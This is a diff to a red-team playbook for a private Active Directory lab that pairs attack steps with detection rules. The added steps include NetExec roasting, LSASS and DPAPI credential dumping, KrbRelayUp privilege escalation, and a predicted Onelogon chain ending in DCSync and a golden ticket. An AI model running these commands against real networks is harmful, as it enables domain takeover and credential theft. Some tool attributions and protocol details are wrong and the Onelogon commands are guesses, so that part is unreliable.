@@ -12,7 +12,7 @@
 ```mermaid
 flowchart LR
     subgraph KALI_GROUP["Kali — Attacker"]
-        K["192.168.77.60<br/>impacket · certipy<br/>bloodyAD · coercer"]
+        K["192.168.77.60<br/>impacket · certipy<br/>bloodyAD · nxc · coercer<br/>lsassy · DonPAPI"]
     end
 
     subgraph F1["Forest 1 — cadre.local"]
@@ -121,6 +121,59 @@ nmap -Pn -sV -sC -p- --min-rate 5000 -T4 192.168.77.10,11,12,22,23,40,50,51,55
 - SSH on all Windows VMs (OpenSSH for Windows)
 - WinRM (5985) on all DCs and member servers
 - NFS on linux01 (2049)
+
+### Step 0.5 — NetExec Quick-Recon (Modern CrackMapExec Replacement) 🆕
+
+**Tool:** [NetExec](https://github.com/Pennyw0rth/NetExec) v1.5.1 (Feb 23 2026). Replaces `crackmapexec`/`cme`. 10 protocols: SMB, LDAP, MSSQL, WinRM, WMI, SSH, RDP, FTP, NFS, VNC. 16+ dump modules including Token Broker Cache (Azure/M365 token theft). Install: `pipx install git+https://github.com/Pennyw0rth/NetExec`.
+
+```bash
+# Quick auth check (any user, any host)
+nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_Blu3!'
+# Output: GREEN [+]/RED [-]/BLUE [*] per host — confirms creds work + shows signing state
+
+# SMB shares + LAPS dump
+nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_Blu3!' --shares -M laps
+
+# LDAP user enumeration (no kerbrute needed for simple lists)
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_Blu3!' -q '(objectClass=user)' -attributes sAMAccountName
+
+# Quick vuln scan against DCs
+nxc smb 192.168.77.10,11,12 -u intern_blue -p '1nt3rn_Blu3!' -M nopac -M zerologon -M petitpotam
+# Output: tells us which DCs are vulnerable to each in seconds
+
+# RID cycling for user enum (legacy method, still useful)
+nxc smb 192.168.77.10 -u guest -p '' --rid-brute 10000
+
+# Vulnerability scan against mssql servers
+nxc mssql 192.168.77.22 -u intern_blue -p '1nt3rn_Blu3!' --local-auth -q 'SELECT SYSTEM_USER'
+
+# NEW: Recon modules (added 2026-06-24 from HexStrike AI article analysis)
+# Pre-Windows 2000 computer account abuse check
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_Blu3!' -M pre2k --kdcHost 192.168.77.10
+# AV/EDR enumeration (SecurityCenter2 WMI) — pre-attack OPSEC
+nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_Blu3!' -M enum_av
+# User description field enumeration (sometimes has plaintext passwords)
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_Blu3!' -M get-desc-users
+
+# CRITICAL: --kdcHost flag for AS-REP roast and Kerberoast
+# Fixes "KDC routing quirk" when running against multi-DC environments (we have 3 DCs)
+# Without --kdcHost, AS-REQ may be sent to an unreachable DC and fail silently
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_Blu3!' --asreproast /tmp/asrep.txt --kdcHost 192.168.77.10
+nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_Blu3!' --kerberoasting /tmp/kerb.txt --kdcHost 192.168.77.10
+```
+
+**Why this matters:** nxc gives us 10-protocol post-ex in one tool. After Phase 1, we use nxc to do everything from password spray to LSASS dump to RBCD write. Replaces:
+- `crackmapexec` (CME) — abandoned Sep 2023, use nxc instead
+- `nmap` for SMB/LDAP/MSSQL auth checks (nxc is faster + multi-protocol)
+- `smbclient` for share enumeration
+- `ldapsearch` for AD queries
+
+**CADRE-specific notes:**
+- All 3 DCs accept nxc SMB/LDAP auth (signing required prevents relay, not auth)
+- mbr01/mbr02 have `SMB signing NOT required` per Step 0 — nxc will report this directly
+- The `nopac` and `zerologon` modules give instant vuln verdict (no script-running needed)
+
+**Cross-references:** See Campaign_suggestions.md #90 for full tool inventory + 16+ dump modules. Direct replacement for `crackmapexec` (none currently in CAMPAIGNS.md since we use bloodyAD + impacket).
 
 ### Step 1 — Anonymous Enumeration (Server 2025 blocks this)
 
@@ -282,6 +335,100 @@ ldapsearch -x -H ldap://dc01.cadre.local -b "DC=cadre,DC=local" "(&(lastLogon=0)
 
 ---
 
+### Step 7 — ADeleg GUI Recon (Alternative to BloodHound) 🆕
+
+**Tool:** [ADeleg](https://github.com/trimarc/ADeleg) (Windows GUI, single `.exe`). Source material at `CADRE-Courses/How to Find Insecure Active Directory Permissions with ADeleg/Episode 173_*.txt` (21,554 bytes).
+
+**Why this exists:** Per the ADeleg podcast Episode 173:
+> "adelec is an active directory delegation management tool ... it gets you almost the same amount of information that bloodhound gets you but with like a third of the hassle — you don't have to set up bloodhound, you don't have to run the sharp pound collector in your environment and trigger all your edr alerts, you don't have to set up docker to like set up the bloodhound ui and node for neoj"
+
+**Differentiators from BloodHound (Phase 4):**
+- ✅ **No SharpHound collector** — avoids EDR alerts
+- ✅ **No Docker / Neo4j** setup
+- ✅ **No LDAP bind required** for full enumeration
+- ✅ **Pure Windows GUI** — drop executable, click Connect
+- ✅ **Direct View by Trustee** — maps directly to attacker perspective
+- ⚠️ **Trade-off:** no graph visualization, no Cypher queries, no path-finding
+
+**Workflow:**
+```powershell
+# 1. Copy ADeleg.exe to a domain-joined Windows VM (mbr01, mbr02, or any DC)
+Copy-Item .\ADeleg.exe \\mbr01\C$\Tools\
+
+# 2. RDP to mbr01, double-click ADeleg.exe
+# 3. Click "Connect" — auto-authenticates as current user
+# 4. View → Index View By → Trustees (reorganizes UI)
+# 5. Select unsafe group on left (e.g., "Authenticated Users")
+# 6. Review resources on right with "Allow" type + flagged permissions
+# 7. For ADCS: View by → Resources → Certificate Templates → check ESC1-8 markers
+```
+
+**"Unsafe users/groups" to check first (per article):**
+- everyone
+- authenticated users
+- domain users
+- domain computers
+- domain join account (often over-permissioned — "i commonly see over permissioned")
+
+**"Unsafe permissions" flagged:**
+- GenericAll / Full Control
+- WriteAllProperties / WriteProperty
+- WriteDacl / WriteOwner
+- ForceChangePassword / ResetPassword
+- Delete / CreateChild / DeleteChild
+- AllExtendedRights (ADCS abuse)
+- Apply-Group-Policy (GPO abuse)
+
+**Maps to:**
+- **Branch A (ACL Abuse)** — visualizes the 14 ACEs from `05-ad-attack-surface.yml` BEFORE exploitation. Confirms playbook deployment worked.
+- **Branch B (ADCS)** — visual scan of ESC1-17 templates from `08-adcs-deploy.yml` BEFORE `certipy find`. Identifies:
+  - ESC4 (vulnerable template ACLs — WriteOwner/WriteDacl on cert template)
+  - ESC1 (enrollee supplies subject + auth EKU)
+  - ESC2 (any purpose EKU)
+  - ESC3 (enrollment agent EKU)
+- **Phase 5 (Delegation)** — surfaces unconstrained + constrained + RBCD delegation paths
+- **Phase 4 (BloodHound)** — pre-recon verification (faster, lower-noise)
+
+**When to use ADeleg vs BloodHound:**
+| Use case | Tool |
+|---|---|
+| Quick triage, no setup, avoid EDR | ADeleg |
+| Deep path-finding, complex queries | BloodHound |
+| ADCS misconfig discovery | Both (ADeleg first, then `certipy find`) |
+| Reports with screenshots | ADeleg (clean GUI) |
+| Reports with path graphs | BloodHound (only option) |
+
+**CADRE-specific notes:**
+- Run ADeleg from mbr01 (domain-joined, less critical than DCs)
+- Visualizes the 14 ACEs from `05-ad-attack-surface.yml`:
+  - ACE#13-14 (eng_agentic → DC: GetChanges + All) — DCSync
+  - ACE#18 (intern_blue → analyst_t2: ForceChangePassword) — Phase 2 path
+  - ACE#20 (dir_operations → mbr01$: GenericWrite) — RBCD path
+  - ACE#23 (analyst_osint → svc_naa: GenericAll) — Phase 8 path
+  - + 10 more
+- Surfaces ADCS ESC1-17 templates from `08-adcs-deploy.yml`:
+  - ESC1-Template (vulnerable ESC1)
+  - ESC2-Template
+  - ESC3-Template
+  - ESC4-Template (vulnerable ACLs)
+- All 3 DCs (dc01, dc02, dc03) have over-permissioned defaults that ADeleg will surface
+
+**Detection (when defender monitors ADeleg recon):**
+- **WinSec 4662** (DS Object Access) — high volume of ACL reads in short period from one source
+- **WinSec 4624 Type 3** — auth from ADeleg source
+- **Zeek LDAP queries** — bulk `searchRequest` with `(objectClass=*)` from single source IP
+- **Sysmon EID 1** — `ADeleg.exe` process creation (process name visible)
+- **Suricata new SID (propose 1000102):** Bulk LDAP queries from single source IP, large ACL-read pattern
+- **Elastic KQL:** `event.code:4662 AND winlog.event_data.SubjectUserName:*` with cardinality > 100 in 60s window
+
+**Cross-references:**
+- Phase 4 (BloodHound) — pre-BloodHound scan
+- Branch A (ACL Abuse — 14 ACEs) — visual confirmation
+- Branch B (ADCS ESC1-17) — visual scan of vulnerable templates
+- See Campaign_suggestions.md #99 (full entry with reasoning + alternative analysis)
+
+---
+
 ## Main Spine — Credential Chain
 
 ### Phase 1 — Initial Access (WT003: AS-REP Roast)
@@ -312,7 +459,12 @@ The scan reveals several valid accounts. One stands out: `intern_blue`.
 From the discovered user list, test for accounts that don't require Kerberos pre-authentication:
 
 ```bash
+# Original (impacket)
 impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 -no-pass -usersfile /tmp/valid_users.txt
+
+# Alternative (NetExec with --kdcHost — CRITICAL for multi-DC environments)
+nxc ldap 192.168.77.11 -u intern_blue -p '1nt3rn_Blu3!' --asreproast /tmp/asrep_ib.txt --kdcHost 192.168.77.11
+# --kdcHost flag fixes "KDC routing quirk" — without it, AS-REQ may be sent to an unreachable DC
 ```
 
 `intern_blue` returns an AS-REP hash. This means the account has `DONT_REQUIRE_PREAUTH` set on its `userAccountControl` attribute — a misconfiguration. The KDC has sent back a TGT encrypted with `intern_blue`'s RC4-derived key, which can be cracked offline.
@@ -376,6 +528,10 @@ impacket-getTGT child.cadre.local/analyst_t2:'Pwn3d_T2!' -dc-ip 192.168.77.11
 export KRB5CCNAME=analyst_t2.ccache
 impacket-GetUserSPNs child.cadre.local/analyst_t2 -k -no-pass \
   -dc-ip 192.168.77.11 -request -outputfile child_tgs.txt
+
+# Alternative (NetExec with --kdcHost — fixes multi-DC routing)
+nxc ldap 192.168.77.11 -u analyst_t2 -p 'Pwn3d_T2!' --kerberoasting /tmp/kerb_t2.txt --kdcHost 192.168.77.11
+# Output: $krb5tgs$23$*svc_mssql$CHILD.CADRE.LOCAL*mbr01.child.cadre.local*$hash...:$
 ```
 
 The output file contains TGS hashes for **both users with SPNs** in child.cadre.local:
@@ -871,6 +1027,92 @@ pypykatz lsa minidump ls.dmp
 
 **Telemetry:** Sysmon 10 (process access on lsass.exe), Endpoint API, cadre-e* candidates.
 
+#### 3.5F-alt — Remote LSASS Dump via lsassy / NetExec (-M lsassy) 🆕
+
+**Tool:** [lsassy v3.1.16](https://github.com/login-securite/lsassy) (Mar 23 2026) — 15+ LSASS dump methods in one tool. Also available as NetExec module.
+
+**Why this alternative:** lsassy automates dump method selection. Auto-picks the best method per target (comsvcs, procdump, nanodump, dumpert, ppldump, silentprocessexit, etc.). More reliable than manual procdump + schtasks.
+
+```bash
+# From Kali against mbr01 (with admin creds from Phase 3 SQL chain)
+lsassy -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
+# Auto-picks best method, dumps, parses, returns credentials
+
+# OR via NetExec module
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -M lsassy
+
+# OR explicit method
+lsassy -m nanodump -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
+```
+
+**CADRE-specific notes:**
+- Requires local admin on target (Phase 3 SQL chain gives us `analyst_t1` with sysadmin on mssql01; can also use `svc_mssql` + GodPotato for SYSTEM on mbr01)
+- Should work in our lab since LSASS PPL is OFF (per `04-vulnerabilities.yml`)
+- Best run from Kali to mbr01 (avoids AV/EDR issues on the target)
+
+**When to use this over 3.5F:** Use lsassy when you want cleaner logon + better evasion. Use manual procdump + schtasks (3.5F) when you need to capture a specific process access pattern for testing detection rules.
+
+**Telemetry:** Same as 3.5F — Sysmon EID 10 (LSASS access), EID 1 (dump method binary), WinSec 4663. Telemetry fingerprint identical for detection engineering purposes.
+
+**Cross-references:** See Campaign_suggestions.md #94 for full lsassy v3.1.16 capabilities. Pairs with DonPAPI (3.5F-dpapi below) for full post-DA coverage.
+
+#### 3.5F-dpapi — Remote DPAPI Credential Harvesting via DonPAPI 🆕
+
+**Tool:** [DonPAPI v2.0+](https://github.com/login-securite/DonPAPI) — remote DPAPI credential harvesting with 12+ collectors (Chromium, Firefox, CredMan, MobaXterm, mRemoteNG, RDCMan, WiFi, VNC, SCCM, Vaults, WinSCP, PuTTY, PSReadLine history).
+
+**Why this matters:** DPAPI-protected secrets are often the most valuable (saved browser creds, VPN creds, WiFi passwords, source-control tokens). DonPAPI automates extraction at scale and auto-dumps the Domain Backup Key for offline master-key decryption.
+
+```bash
+# From Kali against mbr01 (with admin creds + SYSTEM)
+donpapi collect -u child.cadre.local/analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22
+# Auto-fetches Domain Backup Key, dumps all master keys, decrypts all secrets
+# Returns: Chrome/Firefox creds, CredMan entries, WiFi passwords, MobaXterm, etc.
+
+# OR via NetExec module
+nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -M donpapi
+
+# Specific collectors only
+donpapi collect -u analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
+```
+
+**CADRE-specific notes:**
+- Requires SMB admin (Phase 3 + 3.5F gives this)
+- DonPAPI v2.0+ GUI frontend is optional — CLI works fine for lab testing
+- Pair with lsassy: `lsassy` for in-memory creds + `donpapi` for disk-based DPAPI secrets
+
+**Telemetry:** Sysmon EID 1 (donpapi), file create on `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` and `C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data`, WinSec 4663 (file access).
+
+**Cross-references:** See Campaign_suggestions.md #93. Pairs with lsassy (3.5F-alt) for comprehensive post-DA coverage. Together cover 80% of remote cred extraction.
+
+#### 3.5P — KrbRelayUp: LPE via Kerberos Relay (T1068 + T1558) 🆕
+
+**Tool:** [KrbRelay](https://github.com/cube0x0/KrbRelay) + [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) — universal LPE via Kerberos relay + RBCD + S4U2Self in one executable. **No CVE, by-design bypass.**
+
+**Why this matters:** Most LPE 0days (Token Impersonation WT039, PrintSpoofer, GodPotato) are patched on Server 2025. KrbRelayUp abuses default LDAP signing behavior to gain SYSTEM from any local user. Works when other LPE fails.
+
+```bash
+# On Windows (KrbRelayUp — needs local execution as standard user)
+# Step 1: Transfer KrbRelayUp.exe to mbr01 (via any standard-user RCE — e.g., WT063 file detonation)
+# Step 2: Run the relay
+KrbRelayUp.exe relay -d child.cadre.local -cn "EVILBOX$" -cp "Pwn3dByR3lay!" -l 1337
+# Creates new computer EVILBOX$, sets RBCD on target, abuses S4U2Self → SYSTEM
+```
+
+**Pre-conditions:**
+- Standard user with local execute permission (any Phase 1-3 foothold)
+- LDAP signing not enforced on DC (default for many AD configs)
+- Server 2025: works if COM CLSID `90f18417-f0f1-484e-9d3c-59dceee5dbd8` is valid (verify per-target)
+
+**Telemetry:**
+- **WinSec 4742** (Computer Account Created) — `EVILBOX$` creation by low-priv user = HIGH signal
+- **WinSec 4673** (Sensitive Privilege Use) — `SeEnableDelegationPrivilege` by non-admin
+- **WinSec 4662** (DS Object Accessed) — RBCD write on target computer
+- **Elastic KQL candidate**: `event.code:4742 AND (winlog.event_data.SubjectUserName:analyst_cloud OR SubjectUserName:intern_blue OR SubjectUserName:svc_mssql)`
+
+**Cross-references:** See Campaign_suggestions.md #95. Pairs with bloodyAD for cleaner Linux-side RBCD setup. Replaces named pipe impersonation (WT039) and token dance (WT041) for non-DC targets.
+
+**Status:** ⏳ Pending — needs `KrbRelayUp.exe` (compile or pre-built). Test on mbr01 with low-priv user. Verify EVILBOX$ cleanup post-test.
+
 ---
 
 #### 3.5A — Winlogon Registry (T1552.002) ⭐ BACKUP
@@ -1199,6 +1441,35 @@ CADRE has the Cloud Sync agent on dc01. The MSOL account credentials are stored 
 
 **Detection:** Sysmon EID 1 (adconnectdump.exe), file create events on MSOL credential files, Azure AD sign-in log — MSOL from unusual IP.
 
+**Bridge to Plan 11 (Cloud/Entra ID) — BARK as primary tool 🆕:**
+
+After extracting MSOL credentials via adconnectdump, the next attack surface is **Azure/Entra ID**. Per `docs/internal/references/ad-tools-landscape-2026-06-24.md`, the primary tool for Azure/Entra ID abuse validation is **BARK (BloodHound Attack Research Kit)** — https://github.com/BloodHoundAD/BARK.
+
+```powershell
+# In EntraGoat (separate Azure tenant for Plan 11 testing)
+# 1. Clone BARK
+git clone https://github.com/BloodHoundAD/BARK
+# 2. Import module
+Import-Module .\BARK.ps1
+# 3. Enumerate Entra ID
+Get-AllEntraApps
+Get-AllEntraUsers
+Get-AllEntraGroups
+Get-EntraTierZeroServicePrincipals
+# 4. Test abuse primitives
+Invoke-AllEntraAbuseTests
+```
+
+**Why BARK for Plan 11:** BARK has 80+ functions for Azure/Entra ID abuse — token management, Entra enumeration, AzureRM enumeration, Intune enumeration, abuse functions, meta-testing functions. It's the **Azure/Entra equivalent of bloodyAD** for on-prem AD. Same author CravateRouge contributes to both. Used by SpecterOps to validate Azure abuse primitives as Microsoft ships patches.
+
+**CADRE mapping:** Plan 11 is held until after main spine (Phases 0-8 + branches) is verified. When we reach Plan 11:
+- Use BARK for: Entra ID enumeration, abuse chain testing, Intune exploration
+- Use **ROADtools** (Dirk-jan) for: token acquisition, Graph API exploration
+- Use **AADInternals** (Gerenios) for: legacy Azure AD attack primitives
+- Use **AzureHound** (marklindner11) for: BloodHound data ingest for Entra ID
+
+**Cross-references:** See Campaign_suggestions.md #96 for full BARK function inventory. Pairs with bloodyAD (#91) — same author, different domain. Plan 11 items #69-75 (Dirk-jan's Cloud Kerberos Trust, Actor Tokens, PRT Phishing, Intune ADCS, TAP, Federated Creds, App Admin) all use BARK as the validation framework.
+
 ---
 
 #### 3.5N — UnCanny LPE: Non-Admin → SYSTEM via InstallService (T1068, T1574.001) ⏳
@@ -1333,6 +1604,43 @@ coercer coerce -l 192.168.77.22 -t 192.168.77.11 -d child.cadre.local
 | 019 | MS-DFSNM (DFSCoerce) | `--dfscoerce` | ❌ SMB-pipe DCE-RPC not supported by Suricata |
 | 020 | MS-FSRVP (ShadowCoerce) | `--shadowcoerce` | ❌ Service not available on Server 2025 |
 | 094 | **UnCanny Coerce (InstallService)** | `Invoke-InstallServiceCoerce.ps1` | 🔬 Deferred — requires Developer Mode on target VM + admin change to playbook (Track G) |
+| 095 | **Onelogon Zero-Channel (single-channel NRPC)** | `python3 onelogon.py --set-password` | ⏳ Pending — gated on author PoC release (WOOT 2026, 2026-06-24). Bypasses ALL post-Zerologon hardening via `\PIPE\netlogon` over SMB/445. See Campaign_suggestions.md #76 |
+| 096 | **NetExec `coerce_plus` (consolidated check)** 🆕 | `-M coerce_plus` | ⏳ Ready — single command checks PetitPotam/PrinterBug/DFSCoerce/MSEven. Use as Phase 5 pre-flight before individual exploit. See Campaign_suggestions.md #98 |
+
+#### 096 — NetExec `coerce_plus` — Consolidated Coercion Primitive Check 🆕
+
+**Source:** NetExec v1.5.1 `-M coerce_plus` module. Replaces running individual coercion checks (WT017-020, plus MSEven).
+
+**Why this is the new primary recon:**
+- **One command** checks PetitPotam, PrinterBug, DFSCoerce, MSEven, MS-RPRN variants
+- Faster than running 5 individual `nxc -M <each>` checks
+- Returns a single verdict per coercion method
+- Should be the **pre-flight** before deploying specific exploits
+
+```bash
+# Run against all DCs
+nxc smb 192.168.77.10,11,12 -u svc_mssql -p 's3rv1c3_MSSQL!' -M coerce_plus
+
+# Output per DC:
+# DC01:
+#   DFSCoerce:  VULNERABLE
+#   PetitPotam: VULNERABLE
+#   PrinterBug: VULNERABLE
+#   MSEven:     VULNERABLE
+# DC02: similar
+# DC03: similar
+```
+
+**CADRE applicability:** All 3 DCs presumed vulnerable to at least PrinterBug (MS-RPRN) since WT017 confirmed 12 fires on dc02. Run `coerce_plus` against all DCs to get full picture in one shot.
+
+**When to use this over individual WT# checks:**
+- **Phase 5 pre-flight** (before any coercion exploit) — get the full picture
+- **Hardening validation** (after enabling mitigations) — verify all methods blocked
+- **Quarterly assessment** — quick check that no new methods appear
+
+**Telemetry:** Same as individual coercion modules (Suricata SID:1000050-1000053 for active exploitation; `coerce_plus` is a read-only check).
+
+**Cross-references:** See Campaign_suggestions.md #98. Replaces the need for WT017-020 individual recon runs.
 
 #### 094 — UnCanny Coerce: NTLM Coercion via Windows Store InstallService (0xHossam, 2026-06-19) ⏳
 
@@ -1394,6 +1702,126 @@ Invoke-InstallServiceCoerce.ps1 -AttackerHost 192.168.77.60 -Share coerce
 - `CreateInstallServiceWork` COM call from non-system context (`Microsoft-Windows-COM` events)
 
 **Status:** 🔬 Deferred — gated on Developer Mode check on dc01/mbr01/mbr02. If OFF, escalate decision on whether to enable in playbook. Per user 2026-06-19: "document only, defer test" — see Campaign_suggestions.md Track G for deferred path.
+
+#### 095 — Onelogon Zero-Channel: Single-Channel NRPC Authentication Bypass (Pădurean, WOOT 2026) ⏳
+
+**Source:** "Onelogon: An Authentication Bypass for Windows Active Directory via Single-Channel Netlogon" — Alexandru-Vlad Pădurean, WOOT 2026 (Aug 1-3 2026). Paper text at `C:\STUDY\Github\CADRE-Courses\woot2026-onelogon\woot2026-onelogon.txt`. Same author as `krbrelayx` (Kerberos relaying toolkit).
+**MITRE:** T1190 (Exploit Public-Facing Application) + T1187 (Forced Authentication) + T1078.002 (Valid Accounts: Domain Accounts)
+
+**Vulnerability:** MS-NRPC (Netlogon Remote Protocol) defines two channels:
+- **Multi-channel** — direct TCP (typically port 135 EPM + high port). Used for DC-to-DC replication.
+- **Single-channel** — TCP/445 (SMB) via `\PIPE\netlogon` named pipe. Used for client-to-DC authentication.
+
+Post-Zerologon hardening (CVE-2020-1472 patch + SpecterOps "Renaissance of NTLM Relay Attacks" 2025 mitigations) added a **mandatory secure-RPC seal** requirement — but only to the multi-channel variant. **Single-channel NRPC over SMB accepts the legacy non-secure-RPC form.** This means the pre-Zerologon NRPC protocol is still reachable via SMB/445, exposing:
+- **Zero-Channel (Section 5.2):** Call `NetrServerPasswordSet2` against target DC's machine account → set DC machine account password to attacker-known value → DCSync with new password → full domain takeover in 1 RPC call.
+- **AES-CBC8 Downgrade (Section 5.1):** RFC 4753 weak DES challenge-response; compute hash of ANY password (machine, KRBTGT, user) offline.
+
+**Author tested on:** Windows Server 2022 (latest patches). Server 2025 not explicitly tested but the single-channel path is identical on all Server 2016+ — hardening is what changed in 2020+, and it doesn't cover this path. **All 3 CADRE DCs (dc01/dc02/dc03) are presumed vulnerable** until proven otherwise.
+
+**Pre-conditions (all met on CADRE):**
+
+| # | Requirement | CADRE status |
+|---|-------------|--------------|
+| 1 | Network access to TCP/445 (SMB) on target DC | ✅ Default on all 3 DCs |
+| 2 | Knowledge of target DC machine account name | ✅ `DC01$` / `DC02$` / `DC03$` — discoverable via Phase 0 Kerberos enum (SPNs are public) |
+| 3 | NTLM relay of target DC machine account OR knowledge of machine account password | ✅ Achievable via WT017 (MS-RPRN PrinterBug coercion — 12 Suricata SID:1000050 fires confirmed) |
+
+**Step 1 — Coerce target DC to authenticate to attacker listener (from Kali):**
+
+```bash
+# Capture DC machine account via WT017 PrinterBug (already working on CADRE)
+coercer coerce -t 192.168.77.10 -l 192.168.77.22 -d cadre.local \
+  -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
+# OR if coercing dc02 (child.cadre.local):
+coercer coerce -t 192.168.77.11 -l 192.168.77.22 -d child.cadre.local \
+  -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
+```
+
+**Step 2 — Capture DC machine account NTLMv2 on impacket-smbserver:**
+
+- impacket-smbserver logs the auth attempt from `DC01$` (or `DC02$`)
+- Crack with `hashcat -m 5600 captured.txt cadre_passwords.txt` (NTLMv2)
+- **CADRE-specific:** Machine accounts rotate automatically every 30 days — capture-then-crack window is short. Hashcat against `cadre_passwords.txt` (7 known passwords + 17 decoys, `ansible/files/cadre_passwords.txt`) is the fastest path.
+
+**Step 3 — Run Onelogon Zero-Channel (predicted interface — gated on author PoC release):**
+
+```bash
+# Set DC machine account password to attacker-known value
+python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 \
+  --auth 'DC01$:<cracked_hash>' \
+  --set-password 'Pwn3dBy0ne!0g0n!'
+
+# OR Onelogon AES-CBC8 — extract KRBTGT hash directly:
+python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 \
+  --auth 'DC01$:<cracked_hash>' \
+  --extract-hash krbtgt
+# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
+```
+
+**Step 4 — DCSync with new password (Zero-Channel path) or forge Golden Ticket directly (AES-CBC8 path):**
+
+```bash
+# Zero-Channel → DCSync → KRBTGT → Golden Ticket chain
+impacket-secretsdump -just-dc 'cadre.local/Administrator@192.168.77.10' \
+  -hashes :<new_dc01_hash>
+# Now have full hash dump including krbtgt
+python3 ticketer.py -nthash <KRBTGT_NT_HASH> -domain-sid S-1-5-21-... \
+  -domain cadre.local Administrator
+export KRB5CCNAME=/tmp/Administrator.ccache
+impacket-psexec -k -no-pass cadre.local/Administrator@dc01.cadre.local
+```
+
+**Why this is more impactful than existing campaign paths:**
+
+- **Single RPC call = DA.** No need for Kerberos ticket forgery, NTLM relay chain, or RBCD setup.
+- **Works on patched Server 2025.** Bypasses every post-Zerologon hardening deployed since 2020 — including the Microsoft fixes that "patched" the original Zerologon.
+- **No "vulnerable target" prerequisite.** Unlike WT017 which needs Print Spooler running, Onelogon works against any DC with SMB/445 exposed (default).
+- **Direct KRBTGT theft via Section 5.1.** Bypasses DCSync entirely.
+
+**Chain with existing campaign (5 routes from WT095):**
+
+| Route | Downstream | Outcome |
+|-------|-----------|---------|
+| 1 | WT009 DCSync with new DC machine password | All hashes → KRBTGT → Golden Ticket |
+| 2 | Direct AES-CBC8 → KRBTGT hash | Skip DCSync, instant Golden Ticket |
+| 3 | RBCD on DC computer object (no Domain Controller OU protection) | DA via RBCD on dc01$ |
+| 4 | Branch B ADCS ESC1 with new DA privs | DA cert → auth as any user |
+| 5 | Phase 8 (Forest Trust) — compromise child DC's parent TGT, inject SID history | Enterprise Admin (CADRE trust has SID Filter OFF — verified in `01-core-ad.yml`) |
+
+**Detection (cadre-* candidates):**
+
+- **Suricata SID:1000098 (new):** Flag any non-DC source authenticating to `\PIPE\netlogon` over SMB/445. Normal client-to-DC traffic is fine; the signal is server-to-server patterns (DC machine accounts authenticating to other DCs is expected; any other source pattern is suspect).
+- **WinSec 4662 (DS object accessed):** For Zero-Channel — `WriteProperty` on `CN=DC01,...,OU=Domain Controllers,...` with `ObjectType:unicodePwd` (or generic WriteProperty on the computer object) is the **highest-signal event**. Should NEVER happen in normal AD operation.
+- **WinSec 4624 (logon) Type 3** from non-admin source shortly after SMB/445 to DC.
+- **Zeek `zeek-smb.log`:** Named-pipe `netlogon` access from non-DC source. New Zeek notice in `cadre-nrpc.zeek` (script to be written).
+- **Elastic KQL candidate:** `event.code:4662 AND winlog.event_data.ObjectDN:*CN=DC0* AND winlog.event_data.AccessMask:"0000000000000010"` (WriteProperty on DC machine account).
+- **AES-CBC8 detection:** Weak DES challenge-response on NRPC. Zeek can't decode NRPC natively but Suricata can via SMB-dissector-on-netrlogon-pipe. New Suricata SID:1000099 for AES-CBC8 cipher in NRPC.
+
+**Reset / Cleanup (CRITICAL):**
+
+```powershell
+# On the DC that was compromised (dc01 in this example):
+Reset-ComputerMachinePassword -Server dc01.cadre.local -Credential (Get-Credential)
+# This re-establishes the DC's machine account password with the DC itself
+# Without this step, AD replication breaks across the forest
+# Run from any DC in the same domain
+```
+
+**Status:** ⏳ Pending — gated on author PoC release post-WOOT 2026 (expected Aug 2026). Author's repo not yet published at time of this entry (2026-06-24, paper appears 7 days before conference). When PoC is released, add to:
+- `references/sources/onelogon/` (clone, source-only)
+- `references/onelogon-analysis.md` (full breakdown)
+- External references #123+ in `external-references.md`
+- Mechanics section in CAMPAIGNS-METADATA.md (currently stub)
+- plan1.7 §16 (detection engineering)
+- Update WT095 status from ⏳ to ✅ once executed in lab
+
+**Pre-test verification checklist (do BEFORE author PoC release):**
+- [ ] Confirm SMB/445 reachable from Kali to dc01.cadre.local
+- [ ] Confirm SMB/445 reachable from Kali to dc02.child.cadre.local
+- [ ] Confirm `DC01$` / `DC02$` / `DC03$` machine account names via `getTGT.py` no-pass test (should fail with KDC_ERR_PREAUTH_REQUIRED → confirms account exists)
+- [ ] Verify WT017 PrinterBug still works (12 Suricata fires per existing test)
+- [ ] Snapshot dc01, dc02, dc03 before testing (Restore required post-test)
+- [ ] Prepare `Reset-ComputerMachinePassword` reset script ready to run after attack
 
 #### Alternative: RBCD (WT007)
 
@@ -1512,6 +1940,90 @@ impacket-secretsdump -just-dc range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
 
 ---
 
+#### Skipjack — Cross-Forest Trust Downgrade via PAC Signature Corruption (Phase 8 alt) ⏳
+
+**Source:** https://blog.ghostwolflab.com/redteam/786/ — "PAC 签名无效引发的域信任降级攻击" (Domain Trust Downgrade Attack Caused by Invalid PAC Signatures), 2026-06-23. See Campaign_suggestions.md #97.
+
+**Vulnerability mechanism:**
+- Kerberos PAC is signed with **two signatures** (service + KDC) for integrity
+- When signature verification **fails**, Windows DCs have a **downgrade fallback**: look up user in local AD database + rebuild token from AD groups
+- **In cross-forest trust scenarios where SID filtering is disabled**, an attacker can:
+  1. Get a TGT in Forest A
+  2. Modify PAC to inject Forest B's Domain Admins SID (`S-1-5-21-<B>-519`)
